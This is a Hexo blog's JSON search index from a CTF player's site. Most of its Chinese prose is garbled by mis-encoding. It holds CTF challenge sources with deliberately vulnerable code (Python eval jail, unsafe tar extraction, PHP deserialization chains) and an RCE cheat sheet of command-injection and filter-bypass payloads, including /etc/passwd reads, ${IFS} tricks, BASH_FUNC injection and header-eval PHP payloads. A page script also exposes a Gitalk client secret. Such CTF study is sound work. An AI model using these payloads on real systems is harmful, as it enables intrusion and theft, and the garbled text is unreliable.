{"pages":[{"title":"","text":"ä½ ä¼¼ä¹æ¥åˆ°äº†ä¸–ç•Œçš„å°½å¤´","link":"/album/index.html"},{"title":"","text":"&nbsp;&nbsp;å¬å¬éŸ³ä¹ éŸ³ä¹æ’­æ”¾å™¨ç”±mePlayeræä¾›ï¼Œå¸ƒå±€å‚ç…§ç½‘å‹åšå®¢æ‰€ä½œï¼Œæ„Ÿè°¢ä½œè€…çš„è¾›å‹¤ä»˜å‡ºã€‚æ›´å¤šéŸ³ä¹åˆ†äº«è¯·æŸ¥çœ‹æ­Œå•ã€‚ &nbsp;&nbsp;çœ‹çœ‹è§†é¢‘ ->ç‚¹å‡»ä»¥ä¸‹æ¡ç›®å¼€å§‹æ’­æ”¾è§†é¢‘,å‘ä¸‹æ»‘åŠ¨æŸ¥çœ‹æ›´å¤š","link":"/media/index.html"},{"title":"","text":"ğŸš© A CTFer ğŸ’– ACGN ğŸ–¥ï¸ Web 2.0 &amp; Web .03 ğŸª— Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Usernameè¿™ä¸å¾—ä¸å¾—æèµ·æˆ‘çš„é«˜ä¸­ç”Ÿæ´»äº†ã€‚é«˜ä¸€å†›è®­çš„æ—¶å€™ï¼Œæ•™å®˜å«æˆ‘å°èƒ–ï¼Œäºæ˜¯æˆ‘åŒå­¦å°±å¼€å§‹å«æˆ‘é˜¿èƒ–ã€‚æˆ‘çš„é«˜ä¸­è‹±è¯­è€å¸ˆæ™®é€šè¯ä¸æ ‡å‡†ï¼Œæºæ‚ç€ä¸€è‚¡æµ“çƒˆçš„æ–¹è¨€å‘³é“ï¼Œç”šè‡³è‹±æ–‡å•è¯éƒ½æœ‰ä¸€è‚¡æµ“çƒˆçš„â€œåœ°æ–¹ç‰¹è‰²â€ï¼Œæœ‰ä¸€å¤©ï¼Œä»–è¯»è¯¾æ–‡ï¼Œå…´è‡´æ­£æµ“ï¼Œåˆšå¥½è¯»åˆ°äº†ä¸€å¥è¯ï¼Œæ°å·§è¿™å¥è¯é‡Œåˆæœ‰ä¸€ä¸ªuponï¼Œè€Œè¿™ä¸ªuponä»–åˆä¸“é—¨åœé¡¿ä¸€ä¸‹ï¼Œé‡(zhong)è¯»ã€‚å½“æ—¶ï¼Œä¸€è‚¡é›„åšæ— æ¯”è€Œåˆå¤¹æ‚ç€æ–¹è¨€å‘³é“çš„å£°æµªè¢­æ¥ï¼Œä¹‹åæˆ‘åŒå­¦éƒ½ç®¡æˆ‘å«uponäº†ã€‚ è‡³äºåé¢çš„æ•°å­—ï¼Œä¿ºæ¯”è¾ƒæ‡’ï¼Œå“ªå¹´æ³¨å†Œçš„åé¢å°±å†™çš„å“ªå¹´ï¼Œå½“ç„¶ä¹Ÿæœ‰ç‰¹ä¾‹ï¼Œå°±æ˜¯2016ï¼Œè¿™ä¸ªä»£è¡¨çš„ä¸æ˜¯2016å¹´ï¼Œè€Œæ˜¯æŒ‡æ¯”ç‰¹å¸æ¯2016ä¸ªåŒºå—ä¼šå˜æ›´ä¸€æ¬¡æŒ–çŸ¿éš¾åº¦ï¼Œåœ¨ä¸€äº›ä¸åŒºå—é“¾æœ‰å…³çš„ç¤¾åŒºï¼Œæˆ‘æ³¨å†Œçš„idå¤§å¤šæ˜¯UPON-2016","link":"/about/index.html"},{"title":"","text":"å‹æƒ…é“¾æ¥è¿˜åœ¨æ·»åŠ ä¸­qwq åŠ è½½ä¸­ï¼Œç¨ç­‰å‡ ç§’...","link":"/friend/index.html"},{"title":"","text":"æ¥è€Œä¸å¾€éç¤¼ä¹Ÿç•…æ‰€æ¬²è¨€ï¼Œæœ‰ç•™å¿…åº”","link":"/message/index.html"},{"title":"éŸ³ä¹æ­Œå•æ”¶è—","text":"æ¸©é¦¨æç¤ºï¼šé€‰æ‹©å–œæ¬¢çš„éŸ³ä¹åŒå‡»æ’­æ”¾ï¼Œç”±äºç‰ˆæƒåŸå› éƒ¨åˆ†ä¸èƒ½æ’­æ”¾ã€‚å¦‚æœå–œæ¬¢æ­Œå•æ”¶è—ä¸€ä¸‹ï¼Œå»ç½‘æ˜“äº‘éƒ½èƒ½æ’­æ”¾å“Ÿï¼","link":"/music/index.html"},{"title":"","text":"ç¢ç¢å¿µ tipsï¼šgithubç™»å½•åæŒ‰æ—¶é—´æ­£åºæŸ¥çœ‹ã€å¯ç‚¹èµåŠ â¤ï¸ã€æœ¬æ’ä»¶åœ°å€..ã€Œ+99æ¬¡æŸ¥çœ‹ã€ ç¢ç¢å¿µåŠ è½½ä¸­ï¼Œè¯·ç¨ç­‰... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"","text":"[Week1]calc_jail_beginner_level2.5(JAIL)12345678910111213141516171819202122232425262728293031323334353637#the length is be limited less than 13#it seems banned some payload #banned some unintend sol#Can u escape it?Good luck!def filter(s): BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;] for i in BLACKLIST: if i in s: print(f'{i!r} has been banned for security reasons') exit(0)WELCOME = ''' _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | |__ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | ) | | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ | / / |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |/ /_ _ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)____/ __/ | _/ | |___/ |__/ '''print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let's have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)filter(input_data)if len(input_data)&gt;13: print(&quot;Oh hacker!&quot;) exit(0)print('Answer: {}'.format(eval(input_data))) Unicode æ¬ºéª—https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6å¥½æ£’çš„åšå®¢ [WEEK2]calc_jail_beginner_level5(JAIL)1#It\\'s an challenge for jaillevel5 let\\'s read your flag!\\nimport load_flag\\n\\nflag = load_flag.get_flag()\\n\\ndef main():\\n WELCOME = \\'\\'\\'\\n _ _ _ _ _ _ _ _____ \\n | | (_) (_) (_) | | | | ____|\\n | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ \\n | \\'_ \\\\ / _ \\\\/ _` | | \\'_ \\\\| \\'_ \\\\ / _ \\\\ \\'__| | |/ _` | | | |/ _ \\\\ \\\\ / / _ \\\\ |___ \\\\ \\n | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\\\ V / __/ |___) |\\n |_.__/ \\\\___|\\\\__, |_|_| |_|_| |_|\\\\___|_| | |\\\\__,_|_|_|_|\\\\___| \\\\_/ \\\\___|_|____/ \\n __/ | _/ | \\n |___/ |__/ \\n\\'\\'\\'\\n print(WELCOME)\\n print(&quot;It\\'s so easy challenge!&quot;)\\n print(&quot;Seems flag into the dir()&quot;)\\n repl()\\n\\n\\ndef repl():\\n my_global_dict = dict()\\n my_global_dict[\\'my_flag\\'] = flag\\n input_code = input(&quot;&gt; &quot;)\\n complie_code = compile(input_code, \\'&lt;string&gt;\\', \\'single\\')\\n exec(complie_code, my_global_dict)\\n\\nif __name__ == \\'__main__\\':\\n main()","link":"/2022/10/12/HNctf/"},{"title":"å‘½ä»¤æ‰§è¡Œå¤‡å¿˜å½•","text":"0x00 ä»€ä¹ˆæ˜¯RCERCEåˆç§°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚ 0x01 å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°12PHPä»£ç æ‰§è¡Œå‡½æ•°ï¼ševal()ã€assert()ã€preg_replace()ã€create_function()ã€array_map()ã€call_user_func()ã€call_user_func_array()ã€array_filter()ã€uasort()... 12PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šsystem()ã€exec()ã€shell_exec()ã€pcntl_exec()ã€popen()ã€proc_popen()ã€passthru()... 0x02 Bypass1.å…³é”®è¯æ‹¦æˆª: å…³é”®è¯æ›¿æ¢ä¸ºç©ºçš„æƒ…å†µ: åŒå†™ç»•è¿‡ï¼Œæ¯”å¦‚cacatt -&gt; cat ä»…æ‹¦æˆªå…³é”®å­—: ä½¿ç”¨å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚æ‹¦æˆªcatçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å‘½ä»¤ã€‚ Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bashâ€¦ diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} â€¦ â€¦ é€šé…ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨/b??/c?t f*ã€‚è¯¥æ–¹æ³•æœ‰æ—¶å€™ä¼šå› ä¸ºè¾“å‡ºè¿‡å¤šæˆ–è€…è¿è¡Œæ—¶é—´è¶…å‡ºé™åˆ¶è¢«å¼ºè¡Œä¸­æ–­ æ’å…¥&quot;&quot; &lt;&gt; '' \\ç»•è¿‡,æ¯”å¦‚ca''t flag.txtæˆ–è€…ca\\t flag.txt å†…è”æ‰§è¡Œï¼Œå°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ,å¦‚: cat `ls`ï¼Œæˆ–è€…æ˜¯cat ${ls} ä½¿ç”¨å˜é‡æ›¿æ¢ï¼Œå¦‚$c=a;cat fl$cg.php æ‹¦æˆªç©ºæ ¼,ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²ä»£æ›¿ï¼š &lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSç­‰ï¼Œæ¯”å¦‚: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .æ“ä½œç¬¦ evalå‡½æ•°ä¸­ç”¨.æŠŠè¢«æ‹¦æˆªçš„å…³é”®å­—ç»™åˆ†å¼€ï¼Œæ¯”å¦‚ 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); é€ƒé€¸ï¼Œç»•è¿‡å¤ªéš¾äº†ï¼Œç›´æ¥æ¶¦å‡ºæ¥æ¯”å¦‚ 12c=include$_GET[1]?&gt; c=eval($_GET[1]) å€Ÿå£³ç”Ÿè›‹ 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoamiæ˜¯system(â€œwhoamiâ€)å¯åŠ¨çš„bashç¯å¢ƒçš„å‡½æ•°ï¼Œç›¸å½“äºæˆ‘ä»¬æ³¨å†Œäº†ä¸€ä¸ªwhoamiæ›¿æ¢å®ƒ æ„é€  åœ¨PHP7ä¸­ï¼Œå¯ä»¥è¿™æ ·è°ƒç”¨å‡½æ•°: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... ç„¶åå°±å¯ä»¥ä½¿ç”¨å¼‚æˆ–^,å–å~ï¼Œè‡ªå¢++ï¼Œè‡ªå‡--ç­‰æ–¹æ³•æ„é€ æƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡ŒåŠ¨æ€å‡½æ•°è°ƒç”¨ã€‚ æ„é€ å­—ç¬¦çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›PHPçš„ç‰¹æ€§ï¼š PHPä¸­çš„NANå’ŒINFï¼š 123456NaNï¼ˆNot a Numberï¼Œéæ•°ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æ•°å€¼æ•°æ®ç±»å‹çš„ä¸€ç±»å€¼ï¼Œè¡¨ç¤ºæœªå®šä¹‰æˆ–ä¸å¯è¡¨ç¤ºçš„å€¼ã€‚å¸¸åœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­ä½¿ç”¨ã€‚é¦–æ¬¡å¼•å…¥NaNçš„æ˜¯1985å¹´çš„IEEE 754æµ®ç‚¹æ•°æ ‡å‡†ã€‚INFï¼šinfiniteï¼Œè¡¨ç¤ºâ€œæ— ç©·å¤§â€ã€‚ è¶…å‡ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºèŒƒå›´ï¼ˆæº¢å‡ºï¼Œå³é˜¶ç éƒ¨åˆ†è¶…è¿‡å…¶èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼ï¼‰ã€‚$_=C/C;//NAN$_=1/C//INF 2.æ— å›æ˜¾ åˆ©ç”¨sleep()ä¹‹ç±»çš„å‡½æ•°æ¥æ ¹æ®æœåŠ¡å™¨å“åº”çš„æ—¶é—´ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è·è·å–æ³¨:è¯¥æ–¹æ³•å±€é™æ€§å¾ˆå¤§ï¼Œä¸”å®¹æ˜“å—åˆ°ç½‘ç»œæ³¢åŠ¨å½±å“ï¼Œä¸å»ºè®®ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨ åˆ©ç”¨dnså¤–å¸¦http://dnslog.cn/æ³¨:è¯¥æ–¹æ³•ä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œæœ‰é•¿åº¦é™åˆ¶è€Œä¸”ä¸æ”¯æŒç‰¹æ®Šå­—ç¬¦ åˆ©ç”¨é‡å®šå‘ï¼Œå°†è¾“å‡ºé‡å®šå‘åˆ°å¯è®¿é—®ç½‘é¡µä¸­ åå¼¹shellå¦‚æœé¢˜ç›®ä¸å‡ºç½‘åªèƒ½å¯„ å‘½ä»¤æ³¨å…¥,å°è¯•åœ¨å‘½ä»¤åé¢åŠ ä¸Š||ã€%0aã€%0dã€|ã€;ã€&amp;ç­‰ç¬¦å·å°†åŸå…ˆé‡å®šå‘åˆ°/dev/nullçš„å‘½ä»¤åˆ†å‰²å¼€ 3.include ä¼ªåè®® æ—¥å¿—åŒ…å«UAå†™é©¬,åŒ…å«access.log allow_url_include=tureå¯ä»¥ä½¿ç”¨çš„data123456789101112131415dataç±»å‹æ‰©å±•: dataç±»å‹æ‰©å±• data:,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/plain,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/html,&lt;HTMLä»£ç &gt; data:text/html;base64,&lt;base64ç¼–ç çš„HTMLä»£ç &gt; data:text/css,&lt;CSSä»£ç &gt; data:text/css;base64,&lt;base64ç¼–ç çš„CSSä»£ç &gt; data:text/javascript,&lt;Javascriptä»£ç &gt; data:text/javascript;base64,&lt;base64ç¼–ç çš„Javascriptä»£ç &gt; data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® Tips: PHPå…·æœ‰æå¼ºçš„é²æ£’æ€§ç‰¹åˆ«è€æ“ï¼Œå°¤å…¶æ˜¯ä¼ªåè®®è¿™å—ã€‚1234567åŸpayload:php://filter/convert.base64-encode/resource=index.phpæˆ‘å¯ä»¥æ’â™‚ å…¥ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿php://filter/convert.base64-encode/114514/resource=index.phpæˆ‘å¯ä»¥å¤§å¤§å°å°php://FiLTer/convert.base64-encode/resource=index.php 4.æ— å‚å‘½ä»¤æ‰§è¡Œè¿™ç§å°±åŸºæœ¬æ²¡æ´»èƒ½æ•´äº†ï¼Œå·²ç»ååˆ†å›ºå®šä¸‹æ¥äº† 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'çš„è§£é‡Š è¿™é‡Œä½¿ç”¨pregreplaceæ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ\\wåŒ¹é…å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^A-Za-z0-9]ï¼Œç„¶å(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰; ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…a(b(c()))æˆ–a()è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…a(â€œ123â€)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚ ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿ 12345678910111213141516171819202122ç›®å½•æ“ä½œï¼šgetchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚æ•°ç»„ç›¸å…³çš„æ“ä½œï¼šend() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼ã€‚è¯»æ–‡ä»¶show_source() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚readfile() - è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚highlight_file() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚file_get_contents() - æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚readgzfile() - å¯ç”¨äºè¯»å–é gzip æ ¼å¼çš„æ–‡ä»¶ PAYLOAD è¯·æ±‚å¤´ 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); åˆ©ç”¨å…¨å±€å˜é‡è¿›RCE get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å› _GET,_POST, _COOKIE, _FILESå…¨å±€å˜é‡çš„å€¼ï¼Œè¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;filescurrentï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›$_GETå˜é‡çš„æ•°ç»„å€¼ 3.session_start() session_start()ï¼šå¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› TRUE ï¼Œåä¹‹è¿”å› FALSE,è¿”å›å‚æ•°ç»™session_id() session_id()ï¼šè·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰ã€‚æ–‡ä»¶è¯»å– show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));æŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(æƒ³è¯»çš„æ–‡ä»¶)å³å¯","link":"/2022/10/03/RCE/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"},{"title":"Round 6å¤ç°","text":"Web check(V1)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from flask import Flask,requestimport tarfileimport osapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['tar'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/')def index(): with open(__file__, 'r') as f: return f.read()@app.route('/upload', methods=['POST'])def upload_file(): if 'file' not in request.files: return '?' file = request.files['file'] if file.filename == '': return '?' print(file.filename) if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename: file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a tarfile' try: tar = tarfile.open(file_save_path, &quot;r&quot;) tar.extractall(app.config['UPLOAD_FOLDER']) except Exception as e: return str(e) os.remove(file_save_path) return 'success'@app.route('/download', methods=['POST'])def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST'])def clean_file(): os.system('/tmp/clean.sh') return 'success'if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) ç®¡ä»–é‚£ä¹ˆå¤šï¼Œå…ˆæ•´ä¸€ä¸ªä¸Šä¼ é¡µé¢ 1234&lt;form id=&quot;upload-form&quot; action=&quot;http://1.14.71.254:28597/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload&quot; name=&quot;upload&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;","link":"/2022/10/18/Round6/"},{"title":"DasCTF åæœˆæœˆèµ›å¤ç°","text":"å¯„å¯„å¯„ï¼å››é“é¢˜ï¼Œä¸‰é“æˆ‘ä¸æ“…é•¿çš„ååºåˆ—åŒ–ï¼Œå¯„ï¼Œå½“æ—¶è¿˜è¦è€ƒè¯•å¤ä¹ ï¼Œç»“æœæ²¡å¤ªå¤šæ—¶é—´åšï¼Œéº»äº†éƒ½ã€‚ EasyPopè¿™é¢˜é“¾å­å¥½æ‰¾ï¼Œä¹Ÿå¾ˆå¿«å°±æ‰¾åˆ°äº†ï¼Œä½†é—®é¢˜å°±åœ¨äºæœ€åä¸€æ­¥å¦‚ä½•ç»•è¿‡__wakeupï¼Œéº»äº†ï¼Œæˆ‘å°±å¡åœ¨è¿™é‡Œäº†â€¦â€¦.PHPåºåˆ—åŒ–å†·çŸ¥è¯† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?phphighlight_file(__FILE__);error_reporting(0);class fine{private $cmd;private $content;public function __construct($cmd, $content){$this-&gt;cmd = $cmd;$this-&gt;content = $content;}public function __invoke(){call_user_func($this-&gt;cmd, $this-&gt;content);}public function __wakeup(){$this-&gt;cmd = &quot;&quot;;die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);}}class show{public $ctf;public $time = &quot;Two and a half years&quot;;public function __construct($ctf){$this-&gt;ctf = $ctf;}public function __toString(){return $this-&gt;ctf-&gt;show();}public function show(): string{return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;}}class sorry{private $name;private $password;public $hint = &quot;hint is depend on you&quot;;public $key;public function __construct($name, $password){$this-&gt;name = $name;$this-&gt;password = $password;}public function __sleep(){$this-&gt;hint = new secret_code();}public function __get($name){$name = $this-&gt;key;$name();}public function __destruct(){if ($this-&gt;password == $this-&gt;name) {echo $this-&gt;hint;} else if ($this-&gt;name = &quot;jay&quot;) {secret_code::secret();} else {echo &quot;This is our code&quot;;}}public function getPassword(){return $this-&gt;password;}public function setPassword($password): void{$this-&gt;password = $password;}}class secret_code{protected $code;public static function secret(){include_once &quot;hint.php&quot;;hint();}public function __call($name, $arguments){$num = $name;$this-&gt;$num();}private function show(){return $this-&gt;code-&gt;secret;}}if (isset($_GET['pop'])) {$a = unserialize($_GET['pop']);$a-&gt;setPassword(md5(mt_rand()));} else {$a = new show(&quot;Ctfer&quot;);echo $a-&gt;show();} hade_waiboè¿›æ¥ä¸€çœ‹ï¼Œcancan needä»»æ„æ–‡ä»¶è¯»å–ï¼ŒæŠŠæ–‡ä»¶å…¨æ‰’ä¸‹æ¥ï¼Œæ ¸å¿ƒå®åœ¨class.phpé‡Œé¢ï¼Œè‚¯å®šæ˜¯pharååºåˆ—åŒ–ã€‚ä¹ä¸€çœ‹ï¼Œåˆè¦ç»•wakeupï¼Œä¸è¿‡è¿™ä¸€æ¬¡æœ‰å¼•ç”¨èµ‹å€¼ï¼Œå¯ä»¥ç»•ï¼Œå½“æ—¶æ²¡æ—¶é—´äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phpclass User{ public $username; public function __construct($username){ $this-&gt;username = $username; $_SESSION['isLogin'] = True; $_SESSION['username'] = $username; } public function __wakeup(){ $cklen = strlen($_SESSION[&quot;username&quot;]); if ($cklen != 0 and $cklen &lt;= 6) { $this-&gt;username = $_SESSION[&quot;username&quot;]; } } public function __destruct(){ if ($this-&gt;username == '') { session_destroy(); } }}class File{ #æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨ public $white = array(&quot;jpg&quot;,&quot;png&quot;); public function show($filename){ echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\\'file.php?m=show&amp;filename=\\'+document.getElementById(\\'filename\\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;'; if(empty($filename)){die();} return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;'; } public function upload($type){ $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename); return &quot;Upload success! Path: upload/&quot; . $filename; } public function 